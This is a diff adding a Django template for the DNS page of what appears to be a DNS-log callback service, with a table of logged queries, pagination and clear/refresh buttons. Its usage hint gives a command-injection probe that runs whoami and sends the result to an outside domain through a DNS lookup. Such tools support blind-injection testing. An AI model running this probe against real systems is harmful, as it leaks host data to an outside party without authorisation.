@@ -1,0 +1,72 @@
+{% extends "base.html" %}
+{% block usage %}
+    <h3>DNS</h3>
+    <code>Usage:</code>
+    <code>ping `whoami`.1m8.pw</code>
+{% endblock usage %}
+
+{% block button %}
+    <script>
+        function delete_record() {
+            let xml = new XMLHttpRequest();
+            let url = "{% url 'delete_dns_record' %}";
+            xml.open("GET", url, true);
+            xml.onreadystatechange = function f() {
+                window.location.href = '{% url "dns" %}';
+            };
+            xml.send();
+        }
+    </script>
+    <button type="button" class="btn btn-outline-primary" style="min-width: 82px"
+            onclick="window.location.href='{% url "dns" %}'">Refresh
+    </button>
+    <button type="button" class="btn btn-outline-danger" style="min-width: 82px" onclick="delete_record()">Clear
+    </button>
+{% endblock button %}
+
+{% block record %}
+    <table class="table table-hover">
+        <thead>
+        <tr>
+            <th scope="col">#</th>
+            <th scope="col">Query</th>
+            <th scope="col">Time</th>
+            <th scope="col">Source</th>
+        </tr>
+        </thead>
+        <tbody>
+        {% for r in results %}
+            <tr>
+                <th scope="row">{{ forloop.counter }}</th>
+                <td>{{ r.content }}</td>
+                <td>{{ r.time }}</td>
+                <td>{{ r.source }}</td>
+            </tr>
+
+        {% endfor %}
+
+
+        </tbody>
+    </table>
+{% endblock record %}
+
+{% block pagination %}
+    <div class="pagination">
+
+    <span class="step-links">
+        {% if ten_logs.has_previous %}
+            <a href="?page=1">&laquo;</a>
+            <a href="?page={{ ten_logs.previous_page_number }}">{{ ten_logs.previous_page_number }}</a>
+        {% endif %}
+
+        <span class="current" style="color: #c82333">
+            {{ ten_logs.number }}
+        </span>
+
+        {% if ten_logs.has_next %}
+            <a href="?page={{ ten_logs.next_page_number }}">{{ ten_logs.next_page_number }}</a>
+            <a href="?page={{ ten_logs.paginator.num_pages }}">&raquo;</a>
+        {% endif %}
+    </span>
+    </div>
+{% endblock pagination %}
